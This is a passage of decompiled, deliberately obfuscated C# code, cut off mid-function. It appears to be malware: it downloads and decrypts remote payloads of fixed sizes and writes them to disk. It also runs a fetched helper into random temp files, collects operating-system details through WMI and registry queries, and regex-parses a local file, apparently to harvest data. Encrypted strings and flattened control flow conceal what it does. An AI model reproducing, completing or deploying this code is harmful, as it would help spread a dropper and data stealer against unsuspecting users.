using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using System;
using System.Collections;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

[StandardModule]
internal sealed class _____________________________________________________________________
{
	private static string _;

	public static string __;

	[System.Runtime.InteropServices.DllImport("advapi32.dll", SetLastError = true)]
	internal static extern int RegQueryValueEx(System.UIntPtr uintptr_0, string string_0, int int_0, ref int int_1, byte[] byte_0, ref int int_2);

	[System.Runtime.InteropServices.DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int RegOpenKeyEx(System.UIntPtr uintptr_0, [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.VBByRefStr)] ref string string_0, int int_0, int int_1, ref int int_2);

	public static string ___(string string_0)
	{
		string result;
		try
		{
			_____________________________________________________________________._ = ______________________.____ + ______________________________________________________________._______________________ + <Module>.____<string>(1457469466u);
			_____________________________________________________________________.______(string_0);
			string text = _____________________________________________________________________._______() + _____________________________________________________________________.___________() + _____________________________________________________________________.____________();
			result = text;
		}
		catch (System.Exception expr_3D)
		{
			ProjectData.SetProjectError(expr_3D);
			result = <Module>.__________(sizeof(byte) + 61476, System.Type.EmptyTypes.Length + 63235, System.Type.EmptyTypes.Length + 64);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string ____(string string_0)
	{
		string text = ______________________.____ + ______________________________________________________________._______________________ + <Module>.____<string>(3892028685u);
		string result;
		try
		{
			_____________________________________________________________________._____(string_0, text);
			try
			{
				int num;
				string text2;
				int num2;
				if (System.IO.File.Exists(text))
				{
					System.Random random = new System.Random();
					string arg_9F_0 = System.IO.Path.GetTempPath();
					num = random.Next(1000, 9000);
					text2 = arg_9F_0 + num.ToString();
					num2 = System.Type.EmptyTypes.Length + -22497;
					goto IL_69B;
				}
				result = <Module>.__________(sizeof(float) + 2975, System.Type.EmptyTypes.Length + 2920, sizeof(ulong) + 135);
				int num3;
				if ((num3 / 8388608 ^ 7796) == 0)
				{
					goto IL_456;
				}
				return result;
				int arg_65E_0;
				string text3;
				string text4;
				string[] array;
				string text5;
				int ____________;
				string text6;
				string[] array2;
				while (true)
				{
					IL_65E:
					switch (arg_65E_0)
					{
					case 0:
						goto IL_1B4;
					case 1:
						text3 = <Module>._____<string>(688887851u);
						if (text4.Contains(text3))
						{
							arg_65E_0 = System.Type.EmptyTypes.Length + 2;
							continue;
						}
						goto IL_6DC;
					case 2:
						goto IL_61E;
					case 3:
						goto IL_1E1;
					case 4:
						array[3] = text5;
						array[4] = <Module>.____<string>(4093950867u);
						arg_65E_0 = (((-21868544 * (____________ % 114) ^ 1093777739) != 0) ? ((~(num % 64) == num * 28 + 4 * num << 6 << 23) ? (sizeof(int) + -1776496240) : (System.Type.EmptyTypes.Length + 11)) : (sizeof(uint) + -2102345528));
						continue;
					case 5:
						goto IL_3ED;
					case 6:
						goto IL_42C;
					case 8:
						goto IL_542;
					case 9:
						goto IL_456;
					case 10:
						goto IL_3A1;
					case 11:
						goto IL_37F;
					case 12:
						if (text6.Contains(<Module>._______<string>(2059718724u)))
						{
							array2 = Strings.Split(text6, <Module>.___<string>(902284615u), -1, CompareMethod.Binary);
							arg_65E_0 = sizeof(short) + -2;
							continue;
						}
						goto IL_254;
					case 13:
						goto IL_161;
					}
					goto IL_69B;
				}
				IL_37F:
				string text7;
				array[5] = text7;
				array[6] = <Module>.____<string>(3763093088u);
				string text8 = string.Concat(array);
				goto IL_254;
				IL_3A1:
				string[] array4;
				string[] array3 = array4;
				int num4 = 0;
				goto IL_25A;
				IL_61E:
				text8 = <Module>._____<string>(934375637u);
				array4 = Strings.Split(text4, text3, -1, CompareMethod.Binary);
				goto IL_3A1;
				IL_161:
				int arg_16F_0 = 53108736;
				int ____________2 = <Module>._____________;
				if ((arg_16F_0 * ____________2 ^ 2722) != 0)
				{
					goto IL_1E1;
				}
				int arg_191_0 = sizeof(ushort) + -2027711872;
				IL_187:
				text5 = <Module>.__________(arg_191_0, 54363, 181);
				num2 = -23855;
				if (sizeof(short) + 20422 != -6670)
				{
					text7 = <Module>.__________(System.Type.EmptyTypes.Length + 46348, 49330, sizeof(long) + 65);
					arg_65E_0 = System.Type.EmptyTypes.Length + 9;
					goto IL_65E;
				}
				IL_1B4:
				string text9 = <Module>.__________(sizeof(double) + 34155, sizeof(ulong) + 37123, System.Type.EmptyTypes.Length + 199);
				goto IL_161;
				IL_1E1:
				arg_191_0 = System.Type.EmptyTypes.Length + 55486;
				goto IL_187;
				IL_254:
				num4++;
				IL_25A:
				if (num4 >= array3.Length)
				{
					try
					{
						System.IO.File.Delete(text2);
					}
					catch (System.Exception arg_6B4_0)
					{
						ProjectData.SetProjectError(arg_6B4_0);
						ProjectData.ClearProjectError();
					}
					text8 += <Module>._______<string>(1109215133u);
					result = text8;
					return result;
				}
				text6 = array3[num4];
				int ___________ = <Module>.____________;
				if (694478600 + -798085120 * num3 == 454261308)
				{
					arg_65E_0 = -999755947;
					goto IL_65E;
				}
				if (28104 + num2 * 7 + 9 * num2 != (int)((uint)(num2 % 176) >> 27))
				{
					arg_65E_0 = sizeof(ushort) + 10;
					goto IL_65E;
				}
				int arg_2C5_0 = 3;
				____________ = <Module>._____________;
				if ((arg_2C5_0 * ____________ + ____________ & 8) != (4 * (____________ - -9604) & 8))
				{
					arg_65E_0 = (((___________ * -1140850688 + -8825 | -1504) != -89) ? (sizeof(byte) + -2101691860) : 1982366105);
					goto IL_65E;
				}
				int arg_31A_0 = 781;
				int _________ = <Module>.__________;
				int num5;
				arg_65E_0 = ((arg_31A_0 * _________ + 2682 + 243 * _________ != 8829) ? ((((num5 / 65536 + 2984 ^ num5 % 13650589 * 8) & -2147483648) == 0) ? (sizeof(ulong) + -1554143491) : 1379550981) : (System.Type.EmptyTypes.Length + -2008352752));
				goto IL_65E;
				IL_3ED:
				num2 = -29031;
				string text10;
				if (text10.Contains(<Module>._____<string>(1740951417u)))
				{
					text5 = _____________________________________________________________________._____________(text10);
					if (num2 != 5926)
					{
					}
				}
				if (text10.Contains(<Module>._____<string>(578154245u)))
				{
					text7 = _____________________________________________________________________._____________(text10);
					arg_65E_0 = System.Type.EmptyTypes.Length + 6;
					goto IL_65E;
				}
				IL_42C:
				int num6;
				num6++;
				IL_432:
				string[] array5;
				if (num6 >= array5.Length)
				{
					num2 = 23768;
					if (System.Type.EmptyTypes.Length + 14629 != 14629)
					{
						goto IL_456;
					}
					if (!(Operators.CompareString(text9, <Module>.__________(System.Type.EmptyTypes.Length + 55459, (num * 3 + num * 5 - -4294 != 7523) ? 54252 : (System.Type.EmptyTypes.Length + 1511394071), System.Type.EmptyTypes.Length + 178), false) != 0 & Operators.CompareString(text5, <Module>.__________(((num4 << 7) * 5 + (num4 << 7) * 11 != -1672069985) ? 21643 : -1540686376, (~(num6 * 1100 % 65536) == 1677721600 * num6 << 2) ? -723195527 : (System.Type.EmptyTypes.Length + 24567), System.Type.EmptyTypes.Length + 251), false) != 0))
					{
						goto IL_254;
					}
					num2 = 21833;
					if (sizeof(ushort) + 23766 == 22718)
					{
						goto IL_542;
					}
				}
				else
				{
					text10 = array5[num6];
					num2 = 15013;
					int arg_3CE_0 = (int)((uint)(num4 / 259788388) >> 17);
					int ________________ = <Module>._________________;
					if (((arg_3CE_0 ^ ________________ << 8) & 16) == 0)
					{
						if (!text10.Contains(<Module>._______<string>(3174539959u)))
						{
							goto IL_3ED;
						}
						text9 = _____________________________________________________________________._____________(text10);
						num2 = System.Type.EmptyTypes.Length + -29031;
						arg_65E_0 = sizeof(double) + -3;
						goto IL_65E;
					}
				}
				array = new string[7];
				array[0] = text8;
				arg_65E_0 = sizeof(uint) + 4;
				goto IL_65E;
				IL_456:
				array5 = array2;
				num6 = 0;
				goto IL_432;
				IL_542:
				array[1] = text9;
				array[2] = <Module>.______<string>(1514956238u);
				arg_65E_0 = sizeof(long) + -4;
				goto IL_65E;
				IL_69B:
				if (_____________________________________________________________________.______________(text2, text))
				{
					System.Threading.Thread.Sleep(3500);
					if (!System.IO.File.Exists(text2))
					{
						if (num2 == -19769)
						{
							int arg_F5_0 = 4436480;
							int arg_F4_0 = 512;
							int ________________2 = <Module>._________________;
							if (arg_F5_0 + arg_F4_0 * (________________2 - -(2505 & ________________2)) != ________________2 * 65536)
							{
								goto IL_1E1;
							}
						}
						System.Threading.Thread.Sleep(10000);
					}
					if (System.IO.File.Exists(text2))
					{
						text4 = System.IO.File.ReadAllText(text2);
						int num7;
						arg_65E_0 = (((1 & num7 + 1899) != (int)((uint)(94388224 * num7 - 9439) >> 14 & 1u)) ? (sizeof(int) + -1792340070) : checked((int)1.0));
						goto IL_65E;
					}
				}
				IL_6DC:
				result = <Module>.__________(System.Type.EmptyTypes.Length + 32749, 35840, ((3053 ^ (num4 * 25190400 - (num6 << 7)) * num4) == 0) ? (System.Type.EmptyTypes.Length + -1864316095) : 233);
			}
			catch (System.Exception expr_725)
			{
				ProjectData.SetProjectError(expr_725);
				System.Exception ex = expr_725;
				______________________________________________________________.______________(<Module>.____<string>(1187660804u), <Module>._____<string>(2547527197u) + ex.ToString());
				ProjectData.ClearProjectError();
			}
		}
		catch (System.Exception expr_75C)
		{
			ProjectData.SetProjectError(expr_75C);
			int num;
			int ____________2;
			int num6;
			result = <Module>.__________(((2u & (uint)(num6 / 15397) >> 18) != (uint)((num6 + num6) * (2210 & num6) & 2)) ? (System.Type.EmptyTypes.Length + -1010296382) : (System.Type.EmptyTypes.Length + 61981), (3592 + ____________2 * 553648128 == -1798467862) ? (System.Type.EmptyTypes.Length + 1616380673) : ((num / 316779108 != 1996039184) ? (((288 * ____________2 + -4211 + ____________2 * 224 & 3216) == 0) ? -205612073 : (System.Type.EmptyTypes.Length + 65043)) : (System.Type.EmptyTypes.Length + 2059302158)), checked((int)48.0));
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void _____(string string_0, string string_1)
	{
		try
		{
			byte[] byte_;
			if (12756 == System.Type.EmptyTypes.Length + 12756)
			{
				if (!System.IO.File.Exists(string_1))
				{
					int arg_6E_0;
					if (Operators.CompareString(string_0, string.Empty, false) == 0)
					{
						arg_6E_0 = System.Type.EmptyTypes.Length + 0;
					}
					else
					{
						WebClient webClient = new WebClient();
						byte_ = webClient.DownloadData(string_0);
						int num;
						arg_6E_0 = ((~((uint)num >> 18) != (uint)(num / 262144)) ? (sizeof(long) + -7) : (System.Type.EmptyTypes.Length + 834279977));
					}
					switch (arg_6E_0)
					{
					case 0:
						IL_7B:
						break;
					case 1:
						goto IL_80;
					}
					goto IL_7B;
				}
				goto IL_EB;
			}
			IL_80:
			byte[] byte_2 = ___________________________________________________________________._______(byte_, <Module>._____<string>(3503602776u));
			byte[] array = ________________________________________________________________________________.______(byte_2);
			if (array.Length == 99328)
			{
				System.IO.File.WriteAllBytes(string_1, ___________________________________________________________________._______(array, <Module>.__________(51533, System.Type.EmptyTypes.Length + 50346, sizeof(byte) + 77)));
			}
			else
			{
				______________________________________________________________.______________(<Module>.______<string>(3474929201u), <Module>.____<string>(1623218002u));
			}
			IL_EB:;
		}
		catch (System.Exception expr_ED)
		{
			ProjectData.SetProjectError(expr_ED);
			System.Exception ex = expr_ED;
			______________________________________________________________.______________(<Module>.______<string>(3474929201u), <Module>._______<string>(2771761848u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void ______(string string_0)
	{
		try
		{
			if (-4043 != System.Type.EmptyTypes.Length + -4044)
			{
			}
			if (!System.IO.File.Exists(_____________________________________________________________________._))
			{
				if (Operators.CompareString(string_0, string.Empty, false) != 0)
				{
					WebClient webClient = new WebClient();
					byte[] byte_ = webClient.DownloadData(string_0);
					switch (sizeof(ushort) + -2)
					{
					case 0:
					{
						IL_59:
						byte[] byte_2 = ___________________________________________________________________._______(byte_, <Module>.______<string>(869619641u));
						byte[] array = ________________________________________________________________________________.______(byte_2);
						if (array.Length == 348160)
						{
							System.IO.File.WriteAllBytes(_____________________________________________________________________._, ___________________________________________________________________._______(array, <Module>.__________(sizeof(short) + 30537, System.Type.EmptyTypes.Length + 29323, 16)));
							goto IL_C9;
						}
						______________________________________________________________.______________(<Module>.___<string>(1387161447u), <Module>.____<string>(3634157491u));
						goto IL_C9;
					}
					}
					goto IL_59;
				}
			}
			IL_C9:;
		}
		catch (System.Exception expr_CB)
		{
			ProjectData.SetProjectError(expr_CB);
			System.Exception ex = expr_CB;
			______________________________________________________________.______________(<Module>.______<string>(3474929201u), <Module>.____<string>(2723589793u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static string _______()
	{
		string result;
		try
		{
			string text = <Module>.____<string>(1190759839u);
			string text2 = Conversions.ToString(_____________________________________________________________________._________());
			string text3 = Conversions.ToString(_____________________________________________________________________.________());
			int num = System.Type.EmptyTypes.Length + 21307;
			int arg_9F_0 = System.Type.EmptyTypes.Length + 2;
			string[] array;
			while (true)
			{
				IL_9F:
				switch (arg_9F_0)
				{
				case 0:
					goto IL_B2;
				case 1:
					goto IL_B9;
				}
				while (Operators.CompareString(text2, string.Empty, false) == 0 | Operators.CompareString(text3, string.Empty, false) == 0)
				{
					if (num == 21307)
					{
						int ___________ = <Module>.____________;
						if (~(-(___________ | -39950)) == ___________)
						{
							arg_9F_0 = System.Type.EmptyTypes.Length + 0;
							goto IL_9F;
						}
						goto IL_F1;
					}
				}
				array = new string[5];
				array[0] = text;
				arg_9F_0 = checked((int)1.0);
			}
			IL_B2:
			int arg_10B_0 = 1107680784;
			goto IL_F6;
			IL_B9:
			array[1] = text2;
			array[2] = <Module>._____<string>(2815274875u);
			array[3] = text3;
			array[4] = <Module>.____<string>(1190759839u);
			text = string.Concat(array);
			result = text;
			return result;
			IL_F1:
			arg_10B_0 = 59060;
			IL_F6:
			result = <Module>.__________(arg_10B_0, System.Type.EmptyTypes.Length + 58173, sizeof(System.Guid) + 85);
			int arg_125_0 = 8388608;
			int ______________ = <Module>._______________;
			int num2;
			if (((((arg_125_0 * ______________ ^ -9999) | -2225) == -1) ? (((______________ % 32768 << 26) + 31488 != (int)((uint)(______________ % 1757) >> 3)) ? (sizeof(ulong) + -23113) : -1896254368) : (((256u & ((uint)(num2 % 4096) >> 19 ^ (uint)(2048 * num2))) != 0u) ? (System.Type.EmptyTypes.Length + 1214423411) : (System.Type.EmptyTypes.Length + 1795704181))) != -23105)
			{
			}
		}
		catch (System.Exception expr_1A3)
		{
			ProjectData.SetProjectError(expr_1A3);
			int ___________;
			int arg_209_0;
			if (~(___________ << 9) != (4571 ^ ___________) * 512)
			{
				int arg_1CE_0 = 1527;
				int ______________2 = <Module>._______________;
				arg_209_0 = (((arg_1CE_0 * ______________2 + ______________2 * 521 ^ 1001626397) != 0) ? (System.Type.EmptyTypes.Length + 13740) : -1887325221);
			}
			else
			{
				arg_209_0 = sizeof(byte) + -920848524;
			}
			result = <Module>.__________(arg_209_0, 16442, 38);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static object ________()
	{
		object result;
		try
		{
			System.UIntPtr arg_28_0 = (System.UIntPtr)2147483650u;
			string text = <Module>._______<string>(2423756285u);
			int arg_28_2 = 0;
			int arg_28_3 = 257;
			System.UIntPtr uIntPtr;
			int num = (int)((uint)uIntPtr);
			int arg_37_0 = _____________________________________________________________________.RegOpenKeyEx(arg_28_0, ref text, arg_28_2, arg_28_3, ref num);
			uIntPtr = (System.UIntPtr)((ulong)((long)num));
			if (arg_37_0 == 0)
			{
				byte[] byte_ = new byte[2048];
				int num2 = 2048;
				System.UIntPtr arg_5F_0 = uIntPtr;
				string arg_5F_1 = <Module>._____<string>(3878279769u);
				int arg_5F_2 = 0;
				uint num3;
				num = (int)num3;
				int arg_67_0 = _____________________________________________________________________.RegQueryValueEx(arg_5F_0, arg_5F_1, arg_5F_2, ref num, byte_, ref num2);
				num3 = (uint)num;
				if (arg_67_0 == 0)
				{
					string text2 = _____________________________________________________________________.__________(byte_);
					result = text2;
					return result;
				}
			}
			result = string.Empty;
		}
		catch (System.Exception arg_7E_0)
		{
			ProjectData.SetProjectError(arg_7E_0);
			result = string.Empty;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static object _________()
	{
		object result;
		try
		{
			string text = null;
			try
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(<Module>.____<string>(795934529u), <Module>.______<string>(3427649257u));
				try
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator();
					while (enumerator.MoveNext())
					{
						ManagementObject managementObject = (ManagementObject)enumerator.Current;
						text = Conversions.ToString(Operators.ConcatenateObject(text, managementObject[<Module>.___<string>(1176231577u)]));
					}
				}
				finally
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator;
					if (enumerator != null)
					{
						((System.IDisposable)enumerator).Dispose();
					}
				}
			}
			catch (System.Exception arg_70_0)
			{
				ProjectData.SetProjectError(arg_70_0);
				text = <Module>.______<string>(496562882u);
				ProjectData.ClearProjectError();
			}
			try
			{
				ManagementObjectSearcher managementObjectSearcher2 = new ManagementObjectSearcher(<Module>.___<string>(1698050400u), <Module>.____<string>(3808744460u));
				try
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator2 = managementObjectSearcher2.Get().GetEnumerator();
					while (enumerator2.MoveNext())
					{
						ManagementObject managementObject2 = (ManagementObject)enumerator2.Current;
						text = Conversions.ToString(Operators.ConcatenateObject(text, Operators.ConcatenateObject(<Module>.______<string>(851744222u), managementObject2[<Module>._____<string>(2750538808u)])));
					}
				}
				finally
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator2;
					if (enumerator2 != null)
					{
						((System.IDisposable)enumerator2).Dispose();
					}
				}
			}
			catch (System.Exception arg_104_0)
			{
				ProjectData.SetProjectError(arg_104_0);
				text = <Module>.______<string>(496562882u);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (Operators.CompareString(text, <Module>.______<string>(496562882u), false) == 0)
				{
					Computer computer = new Computer();
					text = computer.Info.OSFullName;
				}
			}
			catch (System.Exception expr_148)
			{
				ProjectData.SetProjectError(expr_148);
				text = <Module>.______<string>(496562882u);
				ProjectData.ClearProjectError();
			}
			result = text;
		}
		catch (System.Exception arg_167_0)
		{
			ProjectData.SetProjectError(arg_167_0);
			result = <Module>.___<string>(793063634u);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string __________(byte[] byte_0)
	{
		string result;
		try
		{
			char[] array = new char[24];
			array[0] = 'B';
			int arg_37F_0 = sizeof(System.Guid) + -5;
			char[] array3;
			while (true)
			{
				int num;
				int num2;
				int num3;
				int __________;
				char[] array2;
				System.Collections.ArrayList arrayList;
				int num5;
				switch (arg_37F_0)
				{
				case 0:
					array[11] = 'R';
					array[12] = 'T';
					arg_37F_0 = sizeof(uint) + 5;
					continue;
				case 1:
					num += -1;
					if (num >= 0)
					{
						goto IL_CD;
					}
					if (num2 != -3382)
					{
						goto IL_1B0;
					}
					goto IL_7E;
				case 2:
					goto IL_277;
				case 3:
					array[19] = '4';
					array[20] = '6';
					arg_37F_0 = ((((num3 * 1037 + num3 * 1011) / 1927 ^ -3378) != 0) ? ((int)((System.IntPtr)8)) : (sizeof(float) + 1789452119));
					continue;
				case 4:
					goto IL_2CF;
				case 5:
				{
					array[5] = 'H';
					array[6] = 'J';
					int num4 = num2;
					num2 = -10858;
					if (((2583 ^ __________ / 408487831) & -1968) == 2064)
					{
						if (num4 == -15848)
						{
							goto IL_256;
						}
					}
					array[7] = 'K';
					array[8] = 'M';
					if (num2 != -10858)
					{
						goto IL_2CF;
					}
					array[9] = 'P';
					array[10] = 'Q';
					arg_37F_0 = System.Type.EmptyTypes.Length + 0;
					continue;
				}
				case 6:
					array[23] = '9';
					array2 = array;
					array3 = new char[29];
					if (num2 != -8696)
					{
						arrayList = new System.Collections.ArrayList();
						num5 = 52;
						goto IL_25F;
					}
					goto IL_277;
				case 7:
					goto IL_1B0;
				case 8:
					array[21] = '7';
					array[22] = '8';
					num2 = sizeof(int) + -31789;
					arg_37F_0 = (((num & 53 * num + num * 75) - 2250 != -6565) ? (sizeof(uint) + 2) : (System.Type.EmptyTypes.Length + 1954027345));
					continue;
				case 9:
					array[13] = 'V';
					array[14] = 'W';
					num2 = sizeof(System.Guid) + 10737;
					goto IL_36;
				case 10:
					goto IL_36;
				}
				array[1] = 'C';
				array[2] = 'D';
				arg_37F_0 = sizeof(ushort) + 2;
				continue;
				IL_CD:
				num2 = -4153;
				int num6;
				num3 = (num6 << 8 | (int)Conversions.ToByte(arrayList[num]));
				arrayList[num] = (byte)(num3 / 24);
				arg_37F_0 = ((-1744830464 + -num6 * 134217728 != num6 << 27) ? (System.Type.EmptyTypes.Length + 7) : 783054144);
				continue;
				IL_6E:
				int num7;
				if ((num7 + 1) % 6 == 0)
				{
					array3[num7] = '-';
					goto IL_7E;
				}
				num6 = 0;
				num = 14;
				num2 = -4153;
				if ((((4704 ^ num3 * 931 + num3 * 1117) == 0) ? (System.Type.EmptyTypes.Length + -861602533) : -16345) != -16345)
				{
					goto IL_CD;
				}
				goto IL_CD;
				IL_277:
				num7 = 28;
				goto IL_6E;
				IL_7E:
				num7 += -1;
				if (num7 < 0)
				{
					break;
				}
				goto IL_6E;
				IL_36:
				array[15] = 'X';
				array[16] = 'Y';
				if (((uint)((__________ | 2124) * 32) >> 3 & 2u) != (uint)(2 & __________ * 29352))
				{
					goto IL_7E;
				}
				if (num2 != 10753)
				{
					goto IL_7E;
				}
				array[17] = '2';
				array[18] = '3';
				arg_37F_0 = sizeof(uint) + -1;
				continue;
				IL_1B0:
				num6 = num3 % 24;
				array3[num7] = array2[num6];
				num2 = System.Type.EmptyTypes.Length + -3382;
				int ___________ = <Module>.____________;
				arg_37F_0 = ((((___________ - 2056 ^ ___________) & 4) == 0) ? (sizeof(float) + -3) : (((__________ * 329 + 1719 * __________) / 82 == 1493426870) ? (System.Type.EmptyTypes.Length + -1632021974) : (sizeof(float) + 1797495160)));
				continue;
				IL_2CF:
				array[3] = 'F';
				array[4] = 'G';
				num2 = sizeof(byte) + 12962;
				arg_37F_0 = System.Type.EmptyTypes.Length + 5;
				continue;
				IL_256:
				num5++;
				if (num5 > 67)
				{
					goto IL_277;
				}
				IL_25F:
				arrayList.Add(byte_0[num5]);
				num2 = 1271;
				goto IL_256;
			}
			result = new string(array3);
		}
		catch (System.Exception expr_3C7)
		{
			ProjectData.SetProjectError(expr_3C7);
			int num6;
			int arg_477_0;
			if (((num6 / 26 & num6) ^ 268435580) != 0)
			{
				arg_477_0 = 57179;
			}
			else
			{
				int __________ = <Module>.___________;
				int num7;
				arg_477_0 = ((__________ * 64 != -1308) ? (((num7 * 2 & -2147483648) == ((num7 + num7 ^ 5411) & -2147483648)) ? (System.Type.EmptyTypes.Length + 1356596617) : (System.Type.EmptyTypes.Length + -1161914773)) : -849308599);
			}
			int num3;
			result = <Module>.__________(arg_477_0, (~(num3 / 304 / 1073741824) != 524288 * num3 * 58400768) ? (System.Type.EmptyTypes.Length + 59852) : (sizeof(float) + -2028307654), System.Type.EmptyTypes.Length + 47);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string ___________()
	{
		string result;
		try
		{
			string text;
			while (true)
			{
				IL_1AF:
				string path = Interaction.Environ(<Module>._______<string>(3720245936u)) + <Module>._______<string>(2481867110u);
				switch (System.Type.EmptyTypes.Length + 0)
				{
				case 1:
					goto IL_222;
				}
				while (System.IO.File.Exists(path))
				{
					System.IO.StreamReader streamReader = new System.IO.StreamReader(path);
					string input = streamReader.ReadToEnd();
					int num = 17017;
					if (System.Type.EmptyTypes.Length + 23894 == 27375)
					{
						goto IL_171;
					}
					Regex regex;
					int num2;
					do
					{
						streamReader.Close();
						new System.Text.StringBuilder();
						regex = new Regex(<Module>._____<string>(2394317416u));
						num2 = num;
						num = -29614;
					}
					while (num2 != 17017);
					MatchCollection matchCollection = regex.Matches(input);
					System.Collections.IEnumerator enumerator = matchCollection.GetEnumerator();
					if (num != -30823)
					{
						goto IL_155;
					}
					goto IL_122;
					IL_160:
					if (!enumerator.MoveNext())
					{
						goto Block_6;
					}
					Match match = (Match)enumerator.Current;
					num = -2783;
					if (System.Type.EmptyTypes.Length + -11132 != -11132)
					{
						continue;
					}
					goto IL_EA;
					IL_171:
					string[] array;
					array[3] = <Module>._______<string>(1023697363u);
					GroupCollection groups;
					array[4] = groups[3].Value;
					if (num != 31201)
					{
						goto IL_EA;
					}
					array[5] = <Module>.______<string>(1514956238u);
					string str = string.Concat(array);
					text = text + str + <Module>.______<string>(3443430785u);
					goto IL_160;
					IL_155:
					text = <Module>._____<string>(2300184420u);
					goto IL_160;
					IL_122:
					array[1] = <Module>.___<string>(3242391558u);
					array[2] = groups[2].Value;
					num2 = num;
					num = 31201;
					if (num2 != -5146)
					{
						goto IL_155;
					}
					goto IL_171;
					IL_EA:
					groups = match.Groups;
					array = new string[6];
					array[0] = groups[1].Value;
					num2 = num;
					num = -5146;
					if (num2 != -7403)
					{
						goto IL_122;
					}
					goto IL_1AF;
				}
				goto Block_8;
			}
			Block_6:
			text += <Module>._______<string>(2865274946u);
			result = text;
			return result;
			Block_8:
			result = <Module>.__________(sizeof(double) + 49626, 52934, System.Type.EmptyTypes.Length + 212);
			IL_222:;
		}
		catch (System.Exception arg_224_0)
		{
			ProjectData.SetProjectError(arg_224_0);
			result = <Module>.__________(sizeof(byte) + 63788, System.Type.EmptyTypes.Length + 62312, System.Type.EmptyTypes.Length + 7);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string ____________()
	{
		string result;
		try
		{
			if (142 == System.Type.EmptyTypes.Length + 141)
			{
				goto IL_C1;
			}
			int num;
			int arg_656_0;
			int num2;
			string text;
			int num3;
			if (!System.IO.File.Exists(_____________________________________________________________________._))
			{
				result = <Module>.__________(System.Type.EmptyTypes.Length + 2273, System.Type.EmptyTypes.Length + 919, ((1 & -num) == (-(-5567 & num) & 1)) ? (System.Type.EmptyTypes.Length + 160) : (sizeof(ushort) + -765001082));
				arg_656_0 = System.Type.EmptyTypes.Length + 6;
			}
			else
			{
				System.Random random = new System.Random();
				string arg_9F_0 = System.IO.Path.GetTempPath();
				num2 = random.Next(1000, 9000);
				text = arg_9F_0 + num2.ToString();
				num3 = sizeof(float) + -30565;
				arg_656_0 = System.Type.EmptyTypes.Length + 0;
			}
			string[] array;
			string text2;
			string text5;
			string[] array2;
			int ______;
			while (true)
			{
				IL_656:
				string text3;
				string text4;
				switch (arg_656_0)
				{
				case 0:
					goto IL_460;
				case 1:
					goto IL_138;
				case 2:
					goto IL_2FF;
				case 3:
				{
					array[3] = text2;
					array[4] = <Module>._____<string>(2815274875u);
					int arg_435_0 = 16;
					int _____________ = <Module>.______________;
					arg_656_0 = ((arg_435_0 * (_____________ / 456 + _____________ / 456) - -2147483648 == _____________ / 3) ? (System.Type.EmptyTypes.Length + 745155490) : (System.Type.EmptyTypes.Length + 7));
					continue;
				}
				case 4:
					goto IL_36B;
				case 5:
					text3 = <Module>._______<string>(2111152995u);
					if (text4.Contains(text3))
					{
						goto IL_2FF;
					}
					goto IL_6D3;
				case 7:
					goto IL_2C6;
				case 8:
					goto IL_2A4;
				case 9:
					goto IL_226;
				case 10:
					goto IL_1F3;
				case 11:
					goto IL_C1;
				}
				goto IL_68B;
				IL_2FF:
				text5 = <Module>.______<string>(1108436452u);
				array2 = Strings.Split(text4, text3, -1, CompareMethod.Binary);
				if (num3 / 4194304 - -33882112 == (int)((uint)(8213 ^ num3 / 524288) >> 6))
				{
					arg_656_0 = 2035025896;
				}
				else
				{
					______ = ______________________._______;
					arg_656_0 = ((______ * 43 + ______ * 85 == 974290426) ? 1442213134 : 9);
				}
			}
			IL_2C6:
			string text6;
			array[5] = text6;
			array[6] = <Module>.____<string>(3763093088u);
			text5 = string.Concat(array);
			goto IL_270;
			IL_36B:
			int arg_3DE_0 = System.Type.EmptyTypes.Length + 39688;
			int num4;
			if ((num4 & 956809252) == 0)
			{
			}
			text6 = <Module>.__________(arg_3DE_0, ((-(69 * num + 187 * num) | -70) != -70) ? (System.Type.EmptyTypes.Length + 1117107176) : (sizeof(byte) + 38368), (~(4 * (num2 / 54947)) != num2 / 16777216) ? (System.Type.EmptyTypes.Length + 35) : (sizeof(byte) + -1634100362));
			num3 = 7587;
			if (System.Type.EmptyTypes.Length + -19575 != 1870)
			{
				goto IL_4B3;
			}
			goto IL_25A;
			IL_68B:
			return result;
			IL_C1:
			string text7 = <Module>.__________(60048, System.Type.EmptyTypes.Length + 59075, sizeof(long) + 58);
			int arg_F4_0 = -2600;
			int arg_F3_0 = 16777216;
			int ________________ = <Module>._________________;
			if ((arg_F4_0 | arg_F3_0 * ________________) == -2600)
			{
				if (num3 == 5437)
				{
					goto IL_138;
				}
			}
			text2 = <Module>.__________(sizeof(short) + 22408, System.Type.EmptyTypes.Length + 20922, 162);
			arg_656_0 = System.Type.EmptyTypes.Length + 4;
			goto IL_656;
			IL_138:
			string text8;
			int num5;
			if (text8.Contains(<Module>._______<string>(3248682782u)))
			{
				text7 = _____________________________________________________________________._____________(text8);
				num5 = num3;
				num3 = -22424;
				if (num5 != -14822)
				{
					goto IL_4B3;
				}
			}
			num3 = -22424;
			if (text8.Contains(<Module>._______<string>(4144413825u)))
			{
				text2 = _____________________________________________________________________._____________(text8);
				if (num3 != -22424)
				{
					goto IL_460;
				}
			}
			if (text8.Contains(<Module>._______<string>(4199186373u)))
			{
				text6 = _____________________________________________________________________._____________(text8);
				if (num3 * 2130706432 - (-775 | num3) == -710788624)
				{
					int num6 = checked((int)1950443475.0);
					arg_656_0 = num6;
